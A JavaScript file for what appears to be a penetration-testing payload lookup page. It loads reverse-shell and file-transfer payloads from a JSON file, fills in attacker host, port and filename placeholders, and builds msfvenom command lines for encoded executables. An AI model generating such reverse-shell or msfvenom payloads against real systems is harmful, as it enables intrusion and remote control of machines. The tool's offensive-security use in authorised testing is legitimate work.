document.addEventListener("DOMContentLoaded", () => {
    fetchPayloads();
  });

  let allPayloads = {};

// Populate Primary Filter Options
function populatePrimaryFilter() {
    const primaryFilter = document.getElementById("primaryFilter");
    primaryFilter.innerHTML = '<option value="">Select Vulnerability</option>'; // Reset options
    
    Object.keys(allPayloads).forEach(vulnerabilityType => {
        const option = document.createElement("option");
        option.value = vulnerabilityType;
        option.textContent = vulnerabilityType;
        primaryFilter.appendChild(option);
    });
}

// Update Filters
function updateFilters() {
  const primaryFilter = document.getElementById("primaryFilter").value;
  const secondaryFilter = document.getElementById("secondaryFilter");
  const msfvenomInputs = document.getElementById("msfvenomInputs");

  // Reset fields
  secondaryFilter.style.display = "block";
  msfvenomInputs.style.display = "none";

  if (primaryFilter === "Msfvenom Builder") {
    secondaryFilter.style.display = "none";
    msfvenomInputs.style.display = "block";
    populateMsfvenomDropdowns();
  }
}

function populateMsfvenomDropdowns() {
  const payloadDropdown = document.getElementById("payloadDropdown");
  const formatDropdown = document.getElementById("formatDropdown");
  const encoderDropdown = document.getElementById("encoderDropdown");

  const msfvenomData = allPayloads["Msfvenom Builder"];
  payloadDropdown.innerHTML = msfvenomData.Payloads.map(
    (payload) => `<option value="${payload}">${payload}</option>`
  ).join("");
  formatDropdown.innerHTML = ["raw", "exe", "php", "elf"].map(
    (format) => `<option value="${format}">${format}</option>`
  ).join("");
  encoderDropdown.innerHTML = msfvenomData.Encoder.map(
    (encoder) => `<option value="${encoder}">${encoder}</option>`
  ).join("");
}

// Update Secondary Filter Options
function updateSecondaryFilter() {
    const primaryFilter = document.getElementById("primaryFilter").value;
    const secondaryFilter = document.getElementById("secondaryFilter");
    const dynamicInputs = document.getElementById("dynamicInputs");
    const filenameInput = document.getElementById("filenameInput");
    secondaryFilter.innerHTML = "";
    dynamicInputs.style.display = "none";
    filenameInput.style.display = "none";

    if (primaryFilter === "Reverse Shell") {
      dynamicInputs.style.display = "flex";
    } else if (primaryFilter === "File Transfer") {
      dynamicInputs.style.display = "flex";
      filenameInput.style.display = "inline-block";
    }
  
    if (primaryFilter && allPayloads[primaryFilter]) {
      Object.keys(allPayloads[primaryFilter]).forEach(subType => {
        const option = document.createElement("option");
        option.value = subType;
        option.textContent = subType;
        secondaryFilter.appendChild(option);
      });
      secondaryFilter.classList.remove("disabled");
    } else {
      secondaryFilter.innerHTML = '<option>No Options</option>';
      secondaryFilter.classList.add("disabled");
    }
  } 

  // Function to fetch and load payloads from JSON file
  function fetchPayloads() {
    fetch("payloads.json")
      .then(response => response.json())
      .then(data => {
        allPayloads = data;
        populatePrimaryFilter(); // Populate primary filter options after loading data
      })
      .catch(error => console.error("Error loading payloads:", error));
  }
  
  // Executes search based on filters and optional keyword
  function executeSearch() {
    const primaryFilter = document.getElementById("primaryFilter").value;
    const secondaryFilter = document.getElementById("secondaryFilter").value;
    const keyword = document.getElementById("searchInput").value.trim().toLowerCase();
    const resultsContainer = document.getElementById("searchResults");
    const errorMessage = document.getElementById("error-message");
    const copyButton = document.getElementById("copyButton");
    const lhostInput = document.getElementById("lhostInput").value; // Get the value
    const lportInput = document.getElementById("lportInput").value;
    const filenameInput = document.getElementById("filenameInput").value;
    
    errorMessage.textContent = "";
    resultsContainer.innerHTML = "";
    copyButton.style.display = "none";

    if (keyword && (!primaryFilter || !secondaryFilter)) {
      errorMessage.textContent = "Please set filters to search with keywords.";
      return;
    }
    if (!primaryFilter || !secondaryFilter) {
      errorMessage.textContent = "Please set filters to search.";
      return;
    }

    if (primaryFilter === "Msfvenom Builder") {
      const lhost = document.getElementById("lhostInput").value.trim();
      const lport = document.getElementById("lportInput").value.trim();
      const filename = document.getElementById("filenameInput").value.trim();
      const payload = document.getElementById("payloadDropdown").value;
      const format = document.getElementById("formatDropdown").value;
      const encoder = document.getElementById("encoderDropdown").value;
      const iterations = document.getElementById("iterationsInput").value.trim();
  
      if (!lhost || !lport || !payload || !filename) {
        errorMessage.textContent =
          "Please fill all compulsory fields: LHOST, LPORT, Payload, and Filename.";
        return;
      }
  
      let msfPayload = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format || "raw"}`;
      if (encoder) msfPayload += ` -e ${encoder}`;
      if (iterations) msfPayload += ` -i ${iterations}`;
      msfPayload += ` -o ${filename}`;
  
      resultsContainer.innerHTML = `<div class="payload-item">${msfPayload}</div>`;
      copyButton.style.display = "inline-block";
    }
    
    let filteredPayloads = allPayloads[primaryFilter][secondaryFilter];

     // Replace placeholders if inputs are provided
     if (primaryFilter === "Reverse Shell") {
      filteredPayloads = filteredPayloads.map((payload) =>
        payload.replace(/\[LHOST\]/g, lhostInput || "[LHOST]").replace(/\[LPORT\]/g, lportInput || "[LPORT]")
      );
    } else if (primaryFilter === "File Transfer") {
      filteredPayloads = filteredPayloads.map((payload) =>
        payload
          .replace(/\[LHOST\]/g, lhostInput || "[LHOST]")
          .replace(/\[LPORT\]/g, lportInput || "[LPORT]")
          .replace(/\[File\]/g, filenameInput || "[FILENAME]")
      );
    }
    
    // Filter by keyword if provided
    if (keyword) {
      filteredPayloads = filteredPayloads.filter(payload => payload.toLowerCase().includes(keyword));
    }
    
    // Display filtered payloads or no results message
    if (filteredPayloads.length > 0) {
      filteredPayloads.forEach(payload => {
        const payloadItem = document.createElement("div");
        payloadItem.className = "payload-item";
        payloadItem.textContent = payload;
        resultsContainer.appendChild(payloadItem);
      });
      copyButton.style.display = "inline-block";
    } else {
      resultsContainer.innerHTML = "<p>No payloads found.</p>";
    }
  }

  function copyPayloads() {
    const resultsContainer = document.getElementById("searchResults");
    const payloadItems = resultsContainer.getElementsByClassName("payload-item");

    if (payloadItems.length === 0) return;

    const payloadText = Array.from(payloadItems).map(item => item.textContent).join("\n");

    navigator.clipboard.writeText(payloadText).catch(err => {
      console.error("Error copying payloads:", err);
    });
  }  
      
